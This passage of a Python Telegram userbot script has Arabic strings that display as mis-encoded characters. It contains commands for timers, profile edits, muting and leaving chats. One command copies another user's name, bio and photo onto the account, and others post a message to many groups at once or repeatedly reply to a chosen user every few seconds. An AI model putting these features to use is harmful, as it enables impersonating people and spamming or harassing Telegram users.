            await countdown_message.edit("   ‚Äå‚Äé‚éô** ÿ≥Ÿäÿ®ÿØÿ£ ÿßŸÑÿπÿØ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸä ÿ®ÿπÿØ 2 **")


            
            await asyncio.sleep(1)
            
            
            countdown_message = await countdown_message.edit(f"   ‚Äå‚Äé‚éô** ÿ≥Ÿäÿ®ÿØÿ£ ÿßŸÑÿπÿØ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸä ÿ®ÿπÿØ 1**")
            
            
            while total_seconds > 0:
                minutes, seconds = divmod(total_seconds, 60)
                new_text = f"   ‚Äå‚Äé‚éô** {minutes:02}:{seconds:02} ŸÖÿ™ÿ®ŸÇŸäÿ©**"
                await asyncio.sleep(1)
                total_seconds -= 1

                try:
                    if new_text != countdown_message.text:
                        await countdown_message.edit(new_text)
                except MessageNotModifiedError:
                    pass
            
            await countdown_message.edit("   ‚Äå‚Äé‚éô **ÿßŸÑŸàŸÇÿ™ ÿßŸÜÿ™ŸáŸâ!**")
            
            

        
        active_timers[event.chat_id] = asyncio.create_task(timer_task())
        
    except (ValueError, IndexError):
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: ÿπÿØÿßÿØ (ÿπÿØÿØ ÿßŸÑÿØŸÇÿßÿ¶ŸÇ)")

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸàŸÇŸäŸÅ'))
async def stop_timers(event):
    await event.delete()
    if event.chat_id in active_timers:
        
        active_timers[event.chat_id].cancel()
        del active_timers[event.chat_id]
        
        
        if event.chat_id in countdown_messages:
            try:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]
            except Exception as e:
                print(f"Error deleting countdown message: {e}")

        
        stop_message = await event.reply("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ¨ŸÖŸäÿπ ÿßŸÑÿπÿØÿßÿØÿßÿ™ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸäÿ©.")
        
        
        await asyncio.sleep(3)
        await stop_message.delete()
    else:
        
        no_timer_message = await event.reply("   ‚Äå‚Äé‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿπÿØÿßÿØÿßÿ™ ÿ™ŸÜÿßÿ≤ŸÑŸäÿ© ŸÜÿ¥ÿ∑ÿ© ŸÑÿ•ŸäŸÇÿßŸÅŸáÿß.")
        
        
        await asyncio.sleep(3)
        await no_timer_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿßÿ≥ŸÖ'))
async def set_account_name(event):
    await event.delete()
    global account_name
    try:
        
        command, text = event.raw_text.split(' ', 1)
        if '(' in text and ')' in text:
            account_name = text.split('(', 1)[1].split(')')[0].strip()
        else:
            await event.reply("‚ö†Ô∏è ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: .ÿßŸÑÿßÿ≥ŸÖ (ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸäÿØ)")
            return
        
        
        iraq_tz = tz.gettz('Asia/Baghdad')
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))
        new_username = f"{account_name} - {current_time}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"‚úì ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ•ŸÑŸâ {new_username}‚éô")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ•ŸÑŸâ {new_username}")
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑÿßÿ≥ŸÖ: {e}")
    except ValueError:
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: .ÿßŸÑÿßÿ≥ŸÖ (ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸäÿØ)")


profile_saved = False


async def save_my_profile():
    
    user = await client.get_me()

    
    if not os.path.exists("imagee"):
        os.mkdir("imagee")

    
    current_name = user.first_name  
    current_bio = (await client(GetFullUserRequest(user.id))).full_user.about or ""  
    
    with open("account_info.txt", "w", encoding="utf-8") as f:
        f.write(f"Name: {current_name}\nBio: {current_bio}")
    
    
    if user.photo:
        photo_path = await client.download_profile_photo(user.id, file=f"imagee/my_profile.jpg")
        if photo_path and os.path.exists(photo_path):
            print("‚éô ÿ™ŸÖ ÿ≠ŸÅÿ∏ ÿµŸàÿ±ÿ© ÿ≠ÿ≥ÿßÿ®ŸÉ ÿ®ŸÜÿ¨ÿßÿ≠.")
        else:
            print("‚éô ÿ™ÿπÿ∞ÿ± ÿ≠ŸÅÿ∏ ÿµŸàÿ±ÿ© ÿ≠ÿ≥ÿßÿ®ŸÉ.")
    else:
        print("‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ÿµŸàÿ±ÿ© ŸÑÿ≠ÿ≥ÿßÿ®ŸÉ.")

    print(f"‚éô ÿ™ŸÖ ÿ≠ŸÅÿ∏ ÿßÿ≥ŸÖŸÉ Ÿàÿ®ÿßŸäŸà ÿ≠ÿ≥ÿßÿ®ŸÉ: {current_name}, {current_bio}")


async def impersonate_user(event):
    global profile_saved

    
    if not profile_saved:
        await save_my_profile()
        profile_saved = True  

    
    if event.is_reply:
        reply_message = await event.get_reply_message()
        user = await client(GetFullUserRequest(reply_message.sender_id))

        
        new_name = user.users[0].first_name  
        new_bio = user.full_user.about if user.full_user.about else ""  
        
        try:
            await client(UpdateProfileRequest(first_name=new_name, about=new_bio))
            await event.delete()
            await event.reply(f"‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑÿßÿ≥ŸÖ ÿ•ŸÑŸâ {new_name} ŸàÿßŸÑÿ®ÿßŸäŸà ÿ•ŸÑŸâ: {new_bio}")
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿßÿ≥ŸÖ ÿ£Ÿà ÿßŸÑÿ®ÿßŸäŸà: {e}")

        
        if user.users[0].photo:
            
            if not os.path.exists("hh"):
                os.mkdir("hh")

            
            photo_path = await client.download_profile_photo(user.users[0].id, file=f"hh/{user.users[0].id}.jpg")
            
            
            if photo_path and os.path.exists(photo_path):
                try:
                    
                    await client(DeletePhotosRequest(await client.get_profile_photos('me')))
                    
                    
                    uploaded_file = await client.upload_file(photo_path)

                    
                    await client(UploadProfilePhotoRequest(file=uploaded_file))
                    
                    await event.delete()
                    await event.reply("‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿµŸàÿ±ÿ© ÿßŸÑÿ≠ÿ≥ÿßÿ®")
                except (StickerMimeInvalidError, PhotoExtInvalidError, PhotoCropSizeSmallError, ImageProcessFailedError) as e:
                    await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÑÿµŸàÿ±ÿ©: {e}")
                except Exception as e:
                    await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ∫Ÿäÿ± ŸÖÿ≠ÿØÿØ ÿ£ÿ´ŸÜÿßÿ° ÿ™ÿ∫ŸäŸäÿ± ÿµŸàÿ±ÿ© ÿßŸÑÿ≠ÿ≥ÿßÿ®: {e}")
            else:
                await event.reply("‚éô ŸÑÿß ŸäŸÖŸÑŸÉ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿµŸàÿ±ÿ© ÿ£Ÿà ÿ™ÿπÿ∞ÿ± ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸàÿ±ÿ©.")
        else:
            await event.reply("‚éô ŸÑÿß ŸäŸÖŸÑŸÉ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿµŸàÿ±ÿ©.")


async def restore_profile(event):
    try:
        
        if os.path.exists("account_info.txt"):
            with open("account_info.txt", "r", encoding="utf-8") as f:
                data = f.readlines()
                restored_name = data[0].replace("Name: ", "").strip()
                restored_bio = data[1].replace("Bio: ", "").strip()
            
            await client(UpdateProfileRequest(first_name=restored_name, about=restored_bio))
            await event.delete()
            await event.reply(f"‚éô ÿ™ŸÖ ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ÿßŸÑÿßÿ≥ŸÖ ÿ•ŸÑŸâ {restored_name} ŸàÿßŸÑÿ®ÿßŸäŸà ÿ•ŸÑŸâ: {restored_bio}")
        else:
            await event.reply("‚éô ŸÖŸÑŸÅ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ.")

        
        photo_path = "imagee/my_profile.jpg"  
        if os.path.exists(photo_path):
            uploaded_file = await client.upload_file(photo_path)

            
            await client(DeletePhotosRequest(await client.get_profile_photos('me')))

            
            await client(UploadProfilePhotoRequest(file=uploaded_file))
            
            await event.delete()
            await event.reply("‚éô ÿ™ŸÖ ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ÿµŸàÿ±ÿ© ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ®ŸÜÿ¨ÿßÿ≠.")
        else:
            await event.reply("‚éô ÿ™ÿπÿ∞ÿ± ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑÿµŸàÿ±ÿ© ÿßŸÑŸÖÿ≠ŸÅŸàÿ∏ÿ©.")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ÿßŸÑÿ≠ÿ≥ÿßÿ®: {e}")


@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÜÿ™ÿ≠ÿßŸÑ'))
async def handle_impersonate(event):
    await impersonate_user(event)
    await event.delete()


@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ±ÿ¨ÿßÿπ'))
async def handle_restore(event):
    await restore_profile(event)
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ŸÜÿ¥ÿ± ŸÖÿ¨ŸÖŸàÿπÿßÿ™'))
async def publish_message(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        num_groups, message = args.split('(', 1)[1].split(')')[0], args.split(')', 1)[1].strip()
        num_groups = int(num_groups)
        
        
        dialogs = await client.get_dialogs()
        groups = [dialog for dialog in dialogs if dialog.is_group]
        
        if len(groups) < num_groups:
            await event.reply(f"‚éô ÿπÿØÿØ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑŸÖÿ™ÿßÿ≠ÿ© ÿ£ŸÇŸÑ ŸÖŸÜ {num_groups}.")
            return
        
        
        published_message_ids = []
        for group in groups[:num_groups]:
            msg = await client.send_message(group, message)
            published_message_ids.append((group.id, msg.id))
        
        
        published_messages.append({
            'message': message,
            'group_ids': [group.id for group in groups[:num_groups]],
            'message_ids': published_message_ids
        })
        with open(published_messages_file, 'wb') as f:
            pickle.dump(published_messages, f)
        
        await event.reply(f"‚éô ÿ™ŸÖ ŸÜÿ¥ÿ± ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ŸÅŸä {num_groups} ŸÖÿ¨ŸÖŸàÿπÿ©.")
    except (ValueError, IndexError):
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: ŸÜÿ¥ÿ± (ÿπÿØÿØ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÜÿ¥ÿ± ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©: {e}")


if os.path.exists(muted_users_file):
    with open(muted_users_file, 'rb') as f:
        muted_users = pickle.load(f)
else:
    muted_users = set()


@client.on(events.NewMessage(from_users='me', pattern='.ŸÉÿ™ŸÖ'))
async def mute_user(event):
    await event.delete()
    if event.is_private:
        muted_users.add(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply(" **‚åî‚îäÿ™ŸÖ ÿßŸÑŸÉÿ™ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ‚åî‚îäŸÜÿ≠ŸÜ ÿ®ÿ≠ÿßÿ¨ÿ© ŸÑÿ®ÿπÿ∂ ÿßŸÑŸáÿØŸàÿ° ÿßÿµŸÖÿ™ ‚åî‚îäÿ™ŸÖ ŸÉÿ™ŸÖŸÄŸá ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è**")
    else:
        await event.reply("‚éô ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ŸÅŸä ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿßÿ™ ÿßŸÑÿÆÿßÿµÿ© ŸÅŸÇÿ∑.")

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑŸÉÿ™ŸÖ'))
async def unmute_user(event):
    await event.delete()
    if event.is_private and event.chat_id in muted_users:
        muted_users.remove(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply("‚éô ÿ™ŸÖ ÿßŸÑÿ∫ÿßÿ° ÿßŸÑŸÉÿ™ŸÖ ŸÑŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸÑÿ™ÿ≠ÿØÿ´ ŸÖÿπŸÉ.")
    else:
        await event.reply("‚éô Ÿáÿ∞ÿß ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ∫Ÿäÿ± ŸÖŸÉÿ™ŸàŸÖ")

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑŸÖŸÉÿ™ŸàŸÖŸäŸÜ'))
async def show_muted_users(event):
    await event.delete()
    if muted_users:
        muted_users_list = "\n".join([str(user_id) for user_id in muted_users])
        await event.reply(f"‚éô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ ÿßŸÑŸÖŸÉÿ™ŸàŸÖŸàŸÜ:\n{muted_users_list}")
    else:
        await event.reply("‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ ŸÖŸÉÿ™ŸàŸÖŸàŸÜ ÿ≠ÿßŸÑŸäÿßŸã.")

from telethon import functions

active_ratib_timers = {}
active_bakhsheesh_timers = {}
active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.ÿ±ÿßÿ™ÿ®'))
async def enable_ratib_wad(event):
    await event.delete()
    reply = await event.respond("ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ±ÿßÿ™ÿ®")
    await asyncio.sleep(1)
    await reply.delete()

    if event.chat_id not in active_ratib_timers:
        async def send_ratib():
            while True:
                await client.send_message(event.chat_id, "ÿ±ÿßÿ™ÿ®")
                await asyncio.sleep(660)  

        active_ratib_timers[event.chat_id] = asyncio.create_task(send_ratib())

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿ±ÿßÿ™ÿ®'))
async def disable_ratib_wad(event):
    await event.delete()

    if event.chat_id in active_ratib_timers:
        active_ratib_timers[event.chat_id].cancel()
        del active_ratib_timers[event.chat_id]
    
    reply = await event.respond("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ£ŸÖÿ± ÿ±ÿßÿ™ÿ®")
    await asyncio.sleep(2)
    await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿ®ÿÆÿ¥Ÿäÿ¥'))
async def enable_bakhsheesh_wad(event):
    await event.delete()
    reply = await event.respond("‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ®ÿÆÿ¥Ÿäÿ¥")
    await asyncio.sleep(2)
    await reply.delete()

    if event.chat_id not in active_bakhsheesh_timers:
        async def send_bakhsheesh():
            while True:
                await client.send_message(event.chat_id, "ÿ®ÿÆÿ¥Ÿäÿ¥")
                await asyncio.sleep(660)  

        active_bakhsheesh_timers[event.chat_id] = asyncio.create_task(send_bakhsheesh())

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿ®ÿÆÿ¥Ÿäÿ¥'))
async def disable_bakhsheesh_wad(event):
    await event.delete()

    if event.chat_id in active_bakhsheesh_timers:
        active_bakhsheesh_timers[event.chat_id].cancel()
        del active_bakhsheesh_timers[event.chat_id]
    
    reply = await event.respond("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ£ŸÖÿ± ÿ®ÿÆÿ¥Ÿäÿ¥")
    await asyncio.sleep(2)
    await reply.delete()

active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.ÿ≥ÿ±ŸÇÿ©(?: (\d+))?'))
async def enable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id not in active_sarqa_timers:
            reply = await event.respond("‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ©")
            await asyncio.sleep(2)
            await reply.delete()

            async def send_sarqa():
                while True:
                    try:
                        async for message in client.iter_messages(event.chat_id, from_user=user_id, limit=1):
                            await client.send_message(event.chat_id, "ÿ≤ÿ±ŸÅ", reply_to=message.id)
                        await asyncio.sleep(6)  
                    except Exception as e:
                        print(f"Error: {e}")
                        break

            active_sarqa_timers[user_id] = asyncio.create_task(send_sarqa())
        else:
            reply = await event.respond("‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ© ŸÖÿ≥ÿ®ŸÇŸãÿß.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("Ÿäÿ±ÿ¨Ÿâ ŸÉÿ™ÿßÿ®ÿ© ÿßŸäÿØŸä ÿßŸÑÿ¥ÿÆÿµ ŸÖÿπ ÿßŸÑÿßŸÖÿ±!")
        await asyncio.sleep(2)
        await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿ≥ÿ±ŸÇÿ©(?: (\d+))?'))
async def disable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id in active_sarqa_timers:
            active_sarqa_timers[user_id].cancel()
            del active_sarqa_timers[user_id]
            
            reply = await event.respond("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ©")
            await asyncio.sleep(2)
            await reply.delete()
        else:
            reply = await event.respond("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ© ŸàÿπÿØ ŸÑŸáÿ∞ÿß ÿßŸÑÿ¥ÿÆÿµ.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("Ÿäÿ±ÿ¨Ÿâ ŸÉÿ™ÿßÿ®ÿ© ÿßŸäÿØŸä ÿßŸÑÿ¥ÿÆÿµ ŸÖÿπ ÿßŸÑÿßŸÖÿ±!")
        await asyncio.sleep(2)
        await reply.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™'))
async def leave_channels(event):
    await event.edit("**ÿ¨ÿßÿ±Ÿç ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_channel and not (dialog.is_group or dialog.entity.admin_rights or dialog.entity.creator):
            await client.delete_dialog(dialog)
    await event.edit("**ÿ™ŸÖ ŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™**")

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™'))
async def leave_groups(event):
    await event.edit("**ÿ¨ÿßÿ±Ÿç ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_group and not (dialog.entity.admin_rights or dialog.entity.creator):
            try:
                await client.delete_dialog(dialog)
            except Exception as e:
                print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ® {dialog.name}: {e}")  
    await event.edit("**ÿ™ŸÖ ŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™**")
    
@client.on(events.NewMessage(pattern=r'\.ÿ®ŸÜÿ¨$'))
async def ping(event):
    client.parse_mode = "html" 
    start = datetime.now()
    msg = await event.edit("ÿ≥ÿ±ÿπÿ© ÿßŸÑÿßŸÜÿ™ÿ±ŸÜŸäÿ™!")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await msg.edit(f"<b>ÿ≥ÿ±ÿπÿ© ÿßŸÜÿ™ÿ±ŸÜÿ™ŸÉ!!<b/>\n`{ms} ms`")
        
questions_list = [
    "ŸáŸÑ ÿ™ÿ≠ÿ® IYAD ÿü",
    "ÿ≠ŸÉŸä ŸàÿØŸÉ ŸäŸàÿµŸÑ ŸÑŸÑÿ¥ÿÆÿµ ÿßŸÑŸÖÿ∑ŸÑŸàÿ® ÿü",
    "ŸÖŸÜÿ¥ŸÜ ÿ¥ÿÆÿµ ÿ™ÿ≥ŸàŸÑŸÅ ŸÖÿπŸá ÿ™ŸÜÿ≥Ÿâ ŸáŸÖŸàŸÖ ÿßŸÑÿØŸÜŸäÿß ÿü",
    "ŸÖŸÇŸàŸÑŸá ÿßŸà ŸÖÿ´ŸÑ ÿßŸà ÿ®Ÿäÿ™ ÿ¥ÿπÿ± ŸÇÿ±Ÿäÿ® ŸÖŸÜ ŸÇŸÑÿ®ŸÉÿü",
    "ÿßŸÉÿ´ÿ± ŸÖŸÉÿßŸÜ ÿ™ÿ≠ÿ® ÿ™ÿ±Ÿàÿ≠ ŸÑŸá ŸÅ ÿßŸÑŸàŸäŸÉŸÜÿØ ÿü",
    "ŸÉŸÖ Ÿàÿ¨ÿ®Ÿá ÿ™ÿ¢ŸÉŸÑ ŸÅ ÿßŸÑŸäŸàŸÖ ÿü",
    "ŸÉŸÖ ÿ≥ÿßÿπŸá ÿ™ŸÜÿßŸÖ ŸÅ ÿßŸÑŸäŸàŸÖ ÿü",
    "ŸáŸÑ Ÿàÿ´ŸÇÿ™ ŸÅ ÿßÿ≠ÿØ Ÿà ÿÆÿ∞ŸÑŸÉ ÿü",
    "ŸÉŸÑŸÖŸá ÿ™ÿπÿ®ÿ± ÿπŸÜ ÿ¥ÿπŸàÿ±ŸÉ ÿü",
    "ŸÖŸÜÿ¥ŸÜ ÿ¥ÿÆÿµ ŸÅÿßŸáŸÖŸÉ ŸÅ ŸÉŸÑ ÿ¥Ÿäÿ° ÿü",
    "ŸÖŸÜÿ¥ŸÜ ÿ¥ÿÆÿµ ÿ™ÿ≥ŸàŸÑŸÅ ŸÖÿπŸá ÿ™ŸÜÿ≥Ÿâ ŸáŸÖŸàŸÖ ÿßŸÑÿØŸÜŸäÿß ÿü",
    "ÿßÿµÿØŸÇÿßÿ° ÿßŸÑŸÖŸàÿßŸÇÿπ ÿßŸÅÿ∂ŸÑ ŸÖŸÜ ÿßŸÑŸàÿßŸÇÿπ ÿ™ÿ™ŸÅŸÇÿü",
    "ŸÉŸÑŸÖŸá ŸÖÿπŸäŸÜŸá ŸÖ ŸäŸÅŸáŸÖŸáÿß ÿßŸÑÿß ÿßÿµÿ≠ÿßÿ®ŸÉ ÿü",
    "ŸÉŸÑ ÿ¥Ÿäÿ° ŸäŸáŸàŸÜ ÿßŸÑÿß ÿü",
    "ŸÉŸÑŸÖŸá ÿ™ÿπÿ®ÿ± ÿπŸÜ ÿ¥ÿπŸàÿ±ŸÉ ÿü",
    "ŸÉŸäŸÅ ÿ™ÿ™ÿµÿ±ŸÅ ŸÖÿπ ÿ¥ÿÆÿµ ÿ™ŸÉŸÑŸÖŸá ŸÅŸä ÿ≥ÿßŸÑŸÅŸá ŸÖŸáŸÖŸá ŸàŸäÿµÿ±ŸÅŸÉ ŸàŸÖÿπÿØ Ÿäÿ±ÿØ ÿßÿ®ÿØÿßŸãÿü",
    "ÿ´ŸÑÿßÿ´ ÿßÿ¥Ÿäÿßÿ° ÿ¨ŸÜÿ®ŸÉ ÿßŸÑÿ≠ŸäŸÜ ÿü",
    "ÿ™ÿ¥ŸàŸÅ ÿßŸÜŸà ÿßŸÑÿ™ŸàÿßÿµŸÑ ÿ®ÿ¥ŸÉŸÑ ŸäŸàŸÖŸä ŸÖŸÜ ÿßÿ≥ÿßÿ≥Ÿäÿßÿ™ ÿßŸÑÿ≠ÿ® ÿü",
    "ŸÜŸàÿπŸäÿßÿ™ ŸàÿØŸÉ ŸäŸÜŸÇÿ±ÿ∂ŸàŸÜ ŸÖŸÜ ÿ™ŸàŸäÿ™ÿ±ÿü",
    "ŸÖÿßÿ∞ÿß ÿ™ŸÅÿπŸÑ ÿπŸÜÿØŸÖÿß ÿ™ÿ±Ÿä ÿØŸÖŸàÿπ ÿ≤Ÿàÿ¨ÿ™ŸÉ..ÿü",
    "ŸÖÿß ŸáŸä ŸáŸàÿßŸäÿ™ŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿ©ÿü",
    "ŸÑŸà ÿÆŸäÿ±ŸàŸÉ ÿ™ÿ≥ÿßŸÅÿ± ŸÑÿ£Ÿä ŸÖŸÉÿßŸÜ ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖÿå ŸàŸäŸÜ ÿ®ÿ™ÿ±Ÿàÿ≠ÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿßŸÉŸÑÿ© ÿ™ÿ≠ÿ®Ÿáÿßÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ŸÑŸàŸÜ ÿ™ÿ≠ÿ®Ÿáÿü",
    "ÿ™ÿ≠ÿ® ÿßŸÑŸÇŸáŸàÿ© ÿßŸà ÿßŸÑÿ¥ÿßŸäÿü",
    "ÿßŸäÿ¥ ŸÖŸàŸÇŸÅ ÿµÿßÿ± ŸÑŸÉ ŸÖÿß ÿ™ŸÜÿ≥ÿßŸáÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° Ÿäÿ∂ÿßŸäŸÇŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° Ÿäÿ≥ÿπÿØŸÉÿü",
    "ÿßŸäÿ¥ ŸáŸä ÿßŸÖŸÜŸäÿ™ŸÉ ŸÅŸä ÿßŸÑÿ≠Ÿäÿßÿ©ÿü",
    "ŸÑŸà ŸÉÿßŸÜ ÿ®ÿ•ŸÖŸÉÿßŸÜŸÉ ÿ™ÿ∫ŸäŸäÿ± ÿ¥Ÿäÿ° Ÿàÿßÿ≠ÿØ ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖÿå ŸÖÿßÿ∞ÿß ÿ≥ŸäŸÉŸàŸÜÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑÿ≠ÿ® ŸÖŸÜ ÿßŸàŸÑ ŸÜÿ∏ÿ±ÿ©ÿü",
    "ŸáŸÑ ÿßŸÜÿ™ ÿ¥ÿÆÿµ ÿµÿ®ÿßÿ≠Ÿä ÿßŸà ŸÖÿ≥ÿßÿ¶Ÿäÿü",
    "ŸÖÿß ŸáŸà ÿ®ÿ±ÿ¨ŸÉÿü",
    "ŸÖÿß ŸáŸà ŸÅŸäŸÑŸÖŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿü",
    "ŸÖÿß ŸáŸä ÿßÿ∫ŸÜŸäÿ™ŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿ©ÿü",
    "ŸÖÿß ŸáŸä ŸÅÿ±ŸÇÿ™ŸÉ ÿßŸÑŸÖŸàÿ≥ŸäŸÇŸäÿ© ÿßŸÑŸÖŸÅÿ∂ŸÑÿ©ÿü",
